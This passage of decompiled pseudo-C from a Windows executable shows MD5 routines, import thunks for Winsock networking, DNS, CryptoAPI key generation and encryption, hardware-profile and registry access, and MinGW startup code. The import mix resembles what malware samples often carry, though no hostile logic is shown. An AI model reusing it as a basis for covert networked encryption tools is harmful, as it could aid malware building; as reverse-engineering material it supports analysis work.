  uVar2 = (~uVar3 & uVar4 | uVar1 & uVar3) + local_54 + uVar2 + 0xfcefa3f8;
  uVar2 = (uVar2 * 0x200 | uVar2 >> 0x17) + uVar1;
  uVar3 = (~uVar4 & uVar1 | uVar2 & uVar4) + local_40 + uVar3 + 0x676f02d9;
  uVar3 = (uVar3 * 0x4000 | uVar3 >> 0x12) + uVar2;
  uVar4 = (~uVar1 & uVar2 | uVar3 & uVar1) + local_2c + uVar4 + 0x8d2a4c8a;
  uVar4 = (uVar4 * 0x100000 | uVar4 >> 0xc) + uVar3;
  uVar1 = ((uVar3 ^ uVar4 ^ uVar2) + local_48 + uVar1) - 0x5c6be;
  uVar1 = (uVar1 * 0x10 | uVar1 >> 0x1c) + uVar4;
  uVar2 = (uVar4 ^ uVar1 ^ uVar3) + local_3c + uVar2 + 0x8771f681;
  uVar2 = (uVar2 * 0x800 | uVar2 >> 0x15) + uVar1;
  uVar3 = (uVar1 ^ uVar2 ^ uVar4) + local_30 + uVar3 + 0x6d9d6122;
  uVar3 = (uVar3 * 0x10000 | uVar3 >> 0x10) + uVar2;
  uVar4 = (uVar2 ^ uVar3 ^ uVar1) + local_24 + uVar4 + 0xfde5380c;
  uVar4 = (uVar4 * 0x800000 | uVar4 >> 9) + uVar3;
  uVar1 = (uVar3 ^ uVar4 ^ uVar2) + local_58 + uVar1 + 0xa4beea44;
  uVar1 = (uVar1 * 0x10 | uVar1 >> 0x1c) + uVar4;
  uVar2 = (uVar4 ^ uVar1 ^ uVar3) + local_4c + uVar2 + 0x4bdecfa9;
  uVar2 = (uVar2 * 0x800 | uVar2 >> 0x15) + uVar1;
  uVar3 = (uVar1 ^ uVar2 ^ uVar4) + local_40 + uVar3 + 0xf6bb4b60;
  uVar3 = (uVar3 * 0x10000 | uVar3 >> 0x10) + uVar2;
  uVar4 = (uVar2 ^ uVar3 ^ uVar1) + local_34 + uVar4 + 0xbebfbc70;
  uVar4 = (uVar4 * 0x800000 | uVar4 >> 9) + uVar3;
  uVar1 = (uVar3 ^ uVar4 ^ uVar2) + local_28 + uVar1 + 0x289b7ec6;
  uVar1 = (uVar1 * 0x10 | uVar1 >> 0x1c) + uVar4;
  uVar2 = (uVar4 ^ uVar1 ^ uVar3) + local_5c + uVar2 + 0xeaa127fa;
  uVar2 = (uVar2 * 0x800 | uVar2 >> 0x15) + uVar1;
  uVar3 = (uVar1 ^ uVar2 ^ uVar4) + local_50 + uVar3 + 0xd4ef3085;
  uVar3 = (uVar3 * 0x10000 | uVar3 >> 0x10) + uVar2;
  uVar4 = (uVar2 ^ uVar3 ^ uVar1) + local_44 + uVar4 + 0x4881d05;
  uVar4 = (uVar4 * 0x800000 | uVar4 >> 9) + uVar3;
  uVar1 = (uVar3 ^ uVar4 ^ uVar2) + local_38 + uVar1 + 0xd9d4d039;
  uVar1 = (uVar1 * 0x10 | uVar1 >> 0x1c) + uVar4;
  uVar2 = (uVar4 ^ uVar1 ^ uVar3) + local_2c + uVar2 + 0xe6db99e5;
  uVar2 = (uVar2 * 0x800 | uVar2 >> 0x15) + uVar1;
  uVar3 = (uVar1 ^ uVar2 ^ uVar4) + local_20 + uVar3 + 0x1fa27cf8;
  uVar3 = (uVar3 * 0x10000 | uVar3 >> 0x10) + uVar2;
  uVar4 = (uVar2 ^ uVar3 ^ uVar1) + local_54 + uVar4 + 0xc4ac5665;
  uVar4 = (uVar4 * 0x800000 | uVar4 >> 9) + uVar3;
  uVar1 = ((~uVar2 | uVar4) ^ uVar3) + local_5c + uVar1 + 0xf4292244;
  uVar1 = (uVar1 * 0x40 | uVar1 >> 0x1a) + uVar4;
  uVar2 = ((~uVar3 | uVar1) ^ uVar4) + local_40 + uVar2 + 0x432aff97;
  uVar2 = (uVar2 * 0x400 | uVar2 >> 0x16) + uVar1;
  uVar3 = ((~uVar4 | uVar2) ^ uVar1) + local_24 + uVar3 + 0xab9423a7;
  uVar3 = (uVar3 * 0x8000 | uVar3 >> 0x11) + uVar2;
  uVar4 = ((~uVar1 | uVar3) ^ uVar2) + local_48 + uVar4 + 0xfc93a039;
  uVar4 = (uVar4 * 0x200000 | uVar4 >> 0xb) + uVar3;
  uVar1 = ((~uVar2 | uVar4) ^ uVar3) + local_2c + uVar1 + 0x655b59c3;
  uVar1 = (uVar1 * 0x40 | uVar1 >> 0x1a) + uVar4;
  uVar2 = ((~uVar3 | uVar1) ^ uVar4) + local_50 + uVar2 + 0x8f0ccc92;
  uVar2 = (uVar2 * 0x400 | uVar2 >> 0x16) + uVar1;
  uVar3 = (((~uVar4 | uVar2) ^ uVar1) + local_34 + uVar3) - 0x100b83;
  uVar3 = (uVar3 * 0x8000 | uVar3 >> 0x11) + uVar2;
  uVar4 = ((~uVar1 | uVar3) ^ uVar2) + local_58 + uVar4 + 0x85845dd1;
  uVar4 = (uVar4 * 0x200000 | uVar4 >> 0xb) + uVar3;
  uVar1 = ((~uVar2 | uVar4) ^ uVar3) + local_3c + uVar1 + 0x6fa87e4f;
  uVar1 = (uVar1 * 0x40 | uVar1 >> 0x1a) + uVar4;
  uVar2 = ((~uVar3 | uVar1) ^ uVar4) + local_20 + uVar2 + 0xfe2ce6e0;
  uVar2 = (uVar2 * 0x400 | uVar2 >> 0x16) + uVar1;
  uVar3 = ((~uVar4 | uVar2) ^ uVar1) + local_44 + uVar3 + 0xa3014314;
  uVar3 = (uVar3 * 0x8000 | uVar3 >> 0x11) + uVar2;
  uVar4 = ((~uVar1 | uVar3) ^ uVar2) + local_28 + uVar4 + 0x4e0811a1;
  uVar4 = (uVar4 * 0x200000 | uVar4 >> 0xb) + uVar3;
  uVar1 = ((~uVar2 | uVar4) ^ uVar3) + local_4c + uVar1 + 0xf7537e82;
  local_10 = (uVar1 * 0x40 | uVar1 >> 0x1a) + uVar4;
  uVar1 = ((~uVar3 | local_10) ^ uVar4) + local_30 + uVar2 + 0xbd3af235;
  local_1c = (uVar1 * 0x400 | uVar1 >> 0x16) + local_10;
  uVar1 = ((~uVar4 | local_1c) ^ local_10) + local_54 + uVar3 + 0x2ad7d2bb;
  local_18 = (uVar1 * 0x8000 | uVar1 >> 0x11) + local_1c;
  uVar1 = ((~local_10 | local_18) ^ local_1c) + local_38 + uVar4 + 0xeb86d391;
  local_14 = (uVar1 * 0x200000 | uVar1 >> 0xb) + local_18;
  *param_2 = local_10 + *param_2;
  param_2[1] = local_14 + param_2[1];
  param_2[2] = local_18 + param_2[2];
  param_2[3] = local_1c + param_2[3];
  __ZN3MD510MD5_memsetEPhij(param_1,(int)&local_5c,0,0x40);
  return;
}



void __cdecl __ZN3MD56EncodeEPhPmj(undefined4 param_1,int param_2,int param_3,uint param_4)

{
  uint local_c;
  int local_8;
  
  local_8 = 0;
  for (local_c = 0; local_c < param_4; local_c = local_c + 4) {
    *(char *)(local_c + param_2) = (char)*(undefined4 *)(local_8 * 4 + param_3);
    *(char *)(local_c + param_2 + 1) = (char)((uint)*(undefined4 *)(local_8 * 4 + param_3) >> 8);
    *(char *)(local_c + param_2 + 2) = (char)((uint)*(undefined4 *)(local_8 * 4 + param_3) >> 0x10);
    *(char *)(local_c + param_2 + 3) = (char)((uint)*(undefined4 *)(local_8 * 4 + param_3) >> 0x18);
    local_8 = local_8 + 1;
  }
  return;
}



void __cdecl __ZN3MD56DecodeEPmPhj(undefined4 param_1,int param_2,int param_3,uint param_4)

{
  uint local_10;
  int local_c;
  
  local_c = 0;
  for (local_10 = 0; local_10 < param_4; local_10 = local_10 + 4) {
    *(uint *)(local_c * 4 + param_2) =
         CONCAT13(*(undefined *)(local_10 + param_3 + 3),
                  CONCAT12(*(undefined *)(local_10 + param_3 + 2),
                           CONCAT11(*(undefined *)(local_10 + param_3 + 1),
                                    *(undefined *)(param_3 + local_10))));
    local_c = local_c + 1;
  }
  return;
}



void __cdecl __ZN3MD510MD5_memcpyEPhS0_j(undefined4 param_1,int param_2,int param_3,uint param_4)

{
  uint local_8;
  
  for (local_8 = 0; local_8 < param_4; local_8 = local_8 + 1) {
    *(undefined *)(local_8 + param_2) = *(undefined *)(param_3 + local_8);
  }
  return;
}



void __cdecl
__ZN3MD510MD5_memsetEPhij(undefined4 param_1,int param_2,undefined param_3,uint param_4)

{
  uint local_8;
  
  for (local_8 = 0; local_8 < param_4; local_8 = local_8 + 1) {
    *(undefined *)(local_8 + param_2) = param_3;
  }
  return;
}



void _DnsQuery_A_24(void)

{
                    // WARNING: Could not recover jumptable at 0x0040abe0. Too many branches
                    // WARNING: Treating indirect jump as call
  DnsQuery_A();
  return;
}



void _DnsRecordListFree_8(void)

{
                    // WARNING: Could not recover jumptable at 0x0040abf0. Too many branches
                    // WARNING: Treating indirect jump as call
  DnsRecordListFree();
  return;
}



ulong _inet_addr_4(char *cp)

{
  ulong uVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040ac00. Too many branches
                    // WARNING: Treating indirect jump as call
  uVar1 = inet_addr(cp);
  return uVar1;
}



char * _inet_ntoa_4(in_addr in)

{
  char *pcVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040ac10. Too many branches
                    // WARNING: Treating indirect jump as call
  pcVar1 = inet_ntoa(in);
  return pcVar1;
}



int _WSAStartup_8(WORD wVersionRequired,LPWSADATA lpWSAData)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040ac20. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = WSAStartup(wVersionRequired,lpWSAData);
  return iVar1;
}



hostent * _gethostbyname_4(char *name)

{
  hostent *phVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040ac30. Too many branches
                    // WARNING: Treating indirect jump as call
  phVar1 = gethostbyname(name);
  return phVar1;
}



SOCKET _socket_12(int af,int type,int protocol)

{
  SOCKET SVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040ac40. Too many branches
                    // WARNING: Treating indirect jump as call
  SVar1 = socket(af,type,protocol);
  return SVar1;
}



int _closesocket_4(SOCKET s)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040ac50. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = closesocket(s);
  return iVar1;
}



u_short _htons_4(u_short hostshort)

{
  u_short uVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040ac60. Too many branches
                    // WARNING: Treating indirect jump as call
  uVar1 = htons(hostshort);
  return uVar1;
}



int _connect_12(SOCKET s,sockaddr *name,int namelen)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040ac70. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = connect(s,name,namelen);
  return iVar1;
}



int _send_16(SOCKET s,char *buf,int len,int flags)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040ac80. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = send(s,buf,len,flags);
  return iVar1;
}



int _recv_16(SOCKET s,char *buf,int len,int flags)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040ac90. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = recv(s,buf,len,flags);
  return iVar1;
}



BOOL _CryptAcquireContextA_20
               (HCRYPTPROV *phProv,LPCSTR szContainer,LPCSTR szProvider,DWORD dwProvType,
               DWORD dwFlags)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040aca0. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = CryptAcquireContextA(phProv,szContainer,szProvider,dwProvType,dwFlags);
  return BVar1;
}



BOOL _CryptGenKey_16(HCRYPTPROV hProv,ALG_ID Algid,DWORD dwFlags,HCRYPTKEY *phKey)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040acb0. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = CryptGenKey(hProv,Algid,dwFlags,phKey);
  return BVar1;
}



BOOL _CryptExportKey_24(HCRYPTKEY hKey,HCRYPTKEY hExpKey,DWORD dwBlobType,DWORD dwFlags,BYTE *pbData
                       ,DWORD *pdwDataLen)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040acc0. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = CryptExportKey(hKey,hExpKey,dwBlobType,dwFlags,pbData,pdwDataLen);
  return BVar1;
}



BOOL _CryptImportKey_24(HCRYPTPROV hProv,BYTE *pbData,DWORD dwDataLen,HCRYPTKEY hPubKey,
                       DWORD dwFlags,HCRYPTKEY *phKey)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040acd0. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = CryptImportKey(hProv,pbData,dwDataLen,hPubKey,dwFlags,phKey);
  return BVar1;
}



BOOL _CryptEncrypt_28(HCRYPTKEY hKey,HCRYPTHASH hHash,BOOL Final,DWORD dwFlags,BYTE *pbData,
                     DWORD *pdwDataLen,DWORD dwBufLen)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040ace0. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = CryptEncrypt(hKey,hHash,Final,dwFlags,pbData,pdwDataLen,dwBufLen);
  return BVar1;
}



BOOL _CryptDecrypt_24(HCRYPTKEY hKey,HCRYPTHASH hHash,BOOL Final,DWORD dwFlags,BYTE *pbData,
                     DWORD *pdwDataLen)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040acf0. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = CryptDecrypt(hKey,hHash,Final,dwFlags,pbData,pdwDataLen);
  return BVar1;
}



BOOL _GetCurrentHwProfileA_4(LPHW_PROFILE_INFOA lpHwProfileInfo)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040ad00. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = GetCurrentHwProfileA(lpHwProfileInfo);
  return BVar1;
}



LSTATUS _RegCreateKeyExA_36(HKEY hKey,LPCSTR lpSubKey,DWORD Reserved,LPSTR lpClass,DWORD dwOptions,
                           REGSAM samDesired,LPSECURITY_ATTRIBUTES lpSecurityAttributes,
                           PHKEY phkResult,LPDWORD lpdwDisposition)

{
  LSTATUS LVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040ad10. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = RegCreateKeyExA(hKey,lpSubKey,Reserved,lpClass,dwOptions,samDesired,lpSecurityAttributes,
                          phkResult,lpdwDisposition);
  return LVar1;
}



LSTATUS _RegSetValueExA_24(HKEY hKey,LPCSTR lpValueName,DWORD Reserved,DWORD dwType,BYTE *lpData,
                          DWORD cbData)

{
  LSTATUS LVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040ad20. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = RegSetValueExA(hKey,lpValueName,Reserved,dwType,lpData,cbData);
  return LVar1;
}



LSTATUS _RegCloseKey_4(HKEY hKey)

{
  LSTATUS LVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040ad30. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = RegCloseKey(hKey);
  return LVar1;
}



LSTATUS _RegDeleteValueA_8(HKEY hKey,LPCSTR lpValueName)

{
  LSTATUS LVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040ad40. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = RegDeleteValueA(hKey,lpValueName);
  return LVar1;
}



LSTATUS _RegOpenKeyExA_20(HKEY hKey,LPCSTR lpSubKey,DWORD ulOptions,REGSAM samDesired,
                         PHKEY phkResult)

{
  LSTATUS LVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040ad50. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = RegOpenKeyExA(hKey,lpSubKey,ulOptions,samDesired,phkResult);
  return LVar1;
}



LSTATUS _RegQueryValueExA_24
                  (HKEY hKey,LPCSTR lpValueName,LPDWORD lpReserved,LPDWORD lpType,LPBYTE lpData,
                  LPDWORD lpcbData)

{
  LSTATUS LVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040ad60. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = RegQueryValueExA(hKey,lpValueName,lpReserved,lpType,lpData,lpcbData);
  return LVar1;
}



BOOL _AllocateAndInitializeSid_44
               (PSID_IDENTIFIER_AUTHORITY pIdentifierAuthority,BYTE nSubAuthorityCount,
               DWORD nSubAuthority0,DWORD nSubAuthority1,DWORD nSubAuthority2,DWORD nSubAuthority3,
               DWORD nSubAuthority4,DWORD nSubAuthority5,DWORD nSubAuthority6,DWORD nSubAuthority7,
               PSID *pSid)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040ad70. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = AllocateAndInitializeSid
                    (pIdentifierAuthority,nSubAuthorityCount,nSubAuthority0,nSubAuthority1,
                     nSubAuthority2,nSubAuthority3,nSubAuthority4,nSubAuthority5,nSubAuthority6,
                     nSubAuthority7,pSid);
  return BVar1;
}



PVOID _FreeSid_4(PSID pSid)

{
  PVOID pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040ad80. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = FreeSid(pSid);
  return pvVar1;
}



int __cdecl _main(int _Argc,char **_Argv,char **_Env)

{
  char *pcVar1;
  int iVar2;
  char cVar3;
  char *pcVar4;
  bool bVar5;
  bool bVar6;
  size_t in_stack_ffffff90;
  _STARTUPINFOA local_5c;
  
  __alloca(in_stack_ffffff90);
  ___main();
  pcVar1 = _GetCommandLineA_0();
  _GetStartupInfoA_4(&local_5c);
  if (pcVar1 != (LPSTR)0x0) {
    for (; cVar3 = *pcVar1, cVar3 == ' ' || cVar3 == '\t'; pcVar1 = pcVar1 + 1) {
    }
    if (cVar3 == '\"') {
      do {
        pcVar4 = pcVar1;
        pcVar1 = pcVar4 + 1;
        cVar3 = *pcVar1;
      } while (cVar3 != '\"' && cVar3 != '\0');
      if (cVar3 == '\"') {
        pcVar1 = pcVar4 + 2;
        cVar3 = *pcVar1;
      }
    }
    else if (cVar3 != ' ' && cVar3 != '\t') {
      do {
        if (cVar3 == '\0') break;
        pcVar1 = pcVar1 + 1;
        cVar3 = *pcVar1;
      } while (cVar3 != ' ' && cVar3 != '\t');
    }
    bVar6 = cVar3 == '\t';
    bVar5 = cVar3 == ' ';
    while ((bool)(bVar5 | bVar6)) {
      pcVar1 = pcVar1 + 1;
      bVar6 = *pcVar1 == ' ';
      bVar5 = *pcVar1 == '\t';
    }
  }
  _GetModuleHandleA_4((LPCSTR)0x0);
  iVar2 = _WinMain_16();
  return iVar2;
}



void __pei386_runtime_relocator(void)

{
  int *piVar1;
  
  for (piVar1 = &__RUNTIME_PSEUDO_RELOC_LIST_END__; piVar1 < &__RUNTIME_PSEUDO_RELOC_LIST_END__;
      piVar1 = piVar1 + 2) {
    *(int *)(piVar1[1] + 0x400000) = *(int *)(piVar1[1] + 0x400000) + *piVar1;
  }
  return;
}



void __cdecl __fpreset(void)

{
  return;
}



void ___main(void)

{
  int iVar1;
  bool bVar2;
  
  if (_initialized == 0) {
    _initialized = 1;
    iVar1 = 0;
    bVar2 = false;
    while (!bVar2) {
      iVar1 = iVar1 + 1;
      bVar2 = (&_ctors)[iVar1] == (undefined *)0x0;
    }
    for (; iVar1 != 0; iVar1 = iVar1 + -1) {
      (*(code *)(&___CTOR_LIST__)[iVar1])();
    }
    _atexit();
  }
  return;
}



int * ___w32_sharedptr_get(void)

{
  ATOM in_AX;
  UINT UVar1;
  uint uVar2;
  int iVar3;
  int *piVar4;
  undefined4 uVar5;
  char *pcVar6;
  CHAR local_5c [84];
  
  piVar4 = (int *)0x0;
  UVar1 = GetAtomNameA(in_AX,local_5c,0x42);
  iVar3 = 0x1f;
  uVar2 = 1;
  if (UVar1 == 0) goto LAB_0040b08e;
  do {
    while (local_5c[iVar3] != 'A') {
      uVar2 = uVar2 * 2;
      iVar3 = iVar3 + -1;
      if (iVar3 < 0) goto LAB_0040b05b;
    }
    piVar4 = (int *)((uint)piVar4 | uVar2);
    uVar2 = uVar2 * 2;
    iVar3 = iVar3 + -1;
  } while (-1 < iVar3);
LAB_0040b05b:
  if (*piVar4 != 0x3c) {
    pcVar6 = "w32_sharedptr->size == sizeof(W32_EH_SHARED)";
    uVar5 = 0xea;
    do {
      ___eprintf("%s:%u: failed assertion `%s\'\n","../../gcc/gcc/config/i386/w32-shared-ptr.c",
                 uVar5,pcVar6);
LAB_0040b08e:
      pcVar6 = "GetAtomNameA (atom, s, sizeof(s)) != 0";
      uVar5 = 0xe4;
    } while( true );
  }
  return piVar4;
}



void * __cdecl __alloca(size_t _Size)

{
  uint in_EAX;
  void *pvVar1;
  size_t *psVar2;
  code *UNRECOVERED_JUMPTABLE;
  
  psVar2 = &_Size;
  for (; 0xfff < in_EAX; in_EAX = in_EAX - 0x1000) {
    psVar2 = psVar2 + -0x400;
    *psVar2 = *psVar2;
  }
  *(undefined4 *)((int)psVar2 - in_EAX) = *(undefined4 *)((int)psVar2 - in_EAX);
                    // WARNING: Could not recover jumptable at 0x0040b31b. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (void *)(*UNRECOVERED_JUMPTABLE)();
  return pvVar1;
}



void ___eprintf(char *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  _fprintf((FILE *)(_iob_exref + 0x40),param_1,param_2,param_3,param_4);
  _fflush((FILE *)(_iob_exref + 0x40));
                    // WARNING: Subroutine does not return
  _abort();
}



// WARNING: Exceeded maximum restarts with more pending

void __cdecl __cexit(void)

{
                    // WARNING: Could not recover jumptable at 0x0040b380. Too many branches
                    // WARNING: Treating indirect jump as call
  _cexit();
  return;
}



void ___p__environ(void)

{
                    // WARNING: Could not recover jumptable at 0x0040b390. Too many branches
                    // WARNING: Treating indirect jump as call
  __p__environ();
  return;
}



// WARNING: Unknown calling convention yet parameter storage is locked

void _signal(int param_1)

{
                    // WARNING: Could not recover jumptable at 0x0040b3a0. Too many branches
                    // WARNING: Treating indirect jump as call
  signal(param_1);
  return;
}



void ___p__fmode(void)

{
                    // WARNING: Could not recover jumptable at 0x0040b3b0. Too many branches
                    // WARNING: Treating indirect jump as call
  __p__fmode();
  return;
}



// WARNING: Exceeded maximum restarts with more pending

int __cdecl __setmode(int _FileHandle,int _Mode)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b3c0. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = _setmode();
  return iVar1;
}



// WARNING: Exceeded maximum restarts with more pending

int __cdecl
___getmainargs(int *_Argc,char ***_Argv,char ***_Env,int _DoWildCard,_startupinfo *_StartInfo)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b3d0. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = __getmainargs();
  return iVar1;
}



// WARNING: Exceeded maximum restarts with more pending

uintptr_t __cdecl __beginthread(_StartAddress *_StartAddress,uint _StackSize,void *_ArgList)

{
  uintptr_t uVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b3e0. Too many branches
                    // WARNING: Treating indirect jump as call
  uVar1 = _beginthread();
  return uVar1;
}



// WARNING: Exceeded maximum restarts with more pending

time_t __cdecl _time(time_t *_Time)

{
  time_t tVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b3f0. Too many branches
                    // WARNING: Treating indirect jump as call
  tVar1 = time();
  return tVar1;
}



// WARNING: Exceeded maximum restarts with more pending

void __cdecl _srand(uint _Seed)

{
                    // WARNING: Could not recover jumptable at 0x0040b400. Too many branches
                    // WARNING: Treating indirect jump as call
  srand();
  return;
}



// WARNING: Exceeded maximum restarts with more pending

int __cdecl _fgetc(FILE *_File)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b410. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = fgetc();
  return iVar1;
}



// WARNING: Exceeded maximum restarts with more pending

void * __cdecl _memcpy(void *_Dst,void *_Src,size_t _Size)

{
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b420. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (void *)memcpy();
  return pvVar1;
}



// WARNING: Exceeded maximum restarts with more pending

char * __cdecl _strcpy(char *_Dest,char *_Source)

{
  char *pcVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b430. Too many branches
                    // WARNING: Treating indirect jump as call
  pcVar1 = (char *)strcpy();
  return pcVar1;
}



// WARNING: Exceeded maximum restarts with more pending

void __cdecl _exit(int _Code)

{
                    // WARNING: Could not recover jumptable at 0x0040b440. Too many branches
                    // WARNING: Treating indirect jump as call
  exit();
  return;
}



// WARNING: Exceeded maximum restarts with more pending

int __cdecl _fprintf(FILE *_File,char *_Format,...)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b450. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = fprintf();
  return iVar1;
}



// WARNING: Exceeded maximum restarts with more pending

int __cdecl _sscanf(char *_Src,char *_Format,...)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b460. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = sscanf();
  return iVar1;
}



// WARNING: Exceeded maximum restarts with more pending

char * __cdecl _strstr(char *_Str,char *_SubStr)

{
  char *pcVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b470. Too many branches
                    // WARNING: Treating indirect jump as call
  pcVar1 = (char *)strstr();
  return pcVar1;
}



// WARNING: Exceeded maximum restarts with more pending

char * __cdecl _strcat(char *_Dest,char *_Source)

{
  char *pcVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b480. Too many branches
                    // WARNING: Treating indirect jump as call
  pcVar1 = (char *)strcat();
  return pcVar1;
}



// WARNING: Exceeded maximum restarts with more pending

void * __cdecl _memset(void *_Dst,int _Val,size_t _Size)

{
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b490. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (void *)memset();
  return pvVar1;
}



// WARNING: Exceeded maximum restarts with more pending

int __cdecl _remove(char *_Filename)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b4a0. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = remove();
  return iVar1;
}



// WARNING: Exceeded maximum restarts with more pending

long __cdecl _ftell(FILE *_File)

{
  long lVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b4b0. Too many branches
                    // WARNING: Treating indirect jump as call
  lVar1 = ftell();
  return lVar1;
}



// WARNING: Exceeded maximum restarts with more pending

int __cdecl _strcmp(char *_Str1,char *_Str2)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b4c0. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = strcmp();
  return iVar1;
}



// WARNING: Exceeded maximum restarts with more pending

int __cdecl _sprintf(char *_Dest,char *_Format,...)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b4d0. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = sprintf();
  return iVar1;
}



// WARNING: Exceeded maximum restarts with more pending

size_t __cdecl _strlen(char *_Str)

{
  size_t sVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b4e0. Too many branches
                    // WARNING: Treating indirect jump as call
  sVar1 = strlen();
  return sVar1;
}



// WARNING: Exceeded maximum restarts with more pending

int __cdecl _fseek(FILE *_File,long _Offset,int _Origin)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b4f0. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = fseek();
  return iVar1;
}



// WARNING: Exceeded maximum restarts with more pending

void __cdecl _free(void *_Memory)

{
                    // WARNING: Could not recover jumptable at 0x0040b500. Too many branches
                    // WARNING: Treating indirect jump as call
  free();
  return;
}



// WARNING: Exceeded maximum restarts with more pending

int __cdecl _fclose(FILE *_File)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b510. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = fclose();
  return iVar1;
}



// WARNING: Exceeded maximum restarts with more pending

size_t __cdecl _fread(void *_DstBuf,size_t _ElementSize,size_t _Count,FILE *_File)

{
  size_t sVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b520. Too many branches
                    // WARNING: Treating indirect jump as call
  sVar1 = fread();
  return sVar1;
}



// WARNING: Exceeded maximum restarts with more pending

void * __cdecl _malloc(size_t _Size)

{
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b530. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (void *)malloc();
  return pvVar1;
}



// WARNING: Exceeded maximum restarts with more pending

size_t __cdecl _fwrite(void *_Str,size_t _Size,size_t _Count,FILE *_File)

{
  size_t sVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b540. Too many branches
                    // WARNING: Treating indirect jump as call
  sVar1 = fwrite();
  return sVar1;
}



// WARNING: Exceeded maximum restarts with more pending

int __cdecl _printf(char *_Format,...)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b550. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = printf();
  return iVar1;
}



// WARNING: Exceeded maximum restarts with more pending

int __cdecl _rand(void)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b560. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = rand();
  return iVar1;
}



// WARNING: Exceeded maximum restarts with more pending

FILE * __cdecl _fopen(char *_Filename,char *_Mode)

{
  FILE *pFVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b570. Too many branches
                    // WARNING: Treating indirect jump as call
  pFVar1 = (FILE *)fopen();
  return pFVar1;
}



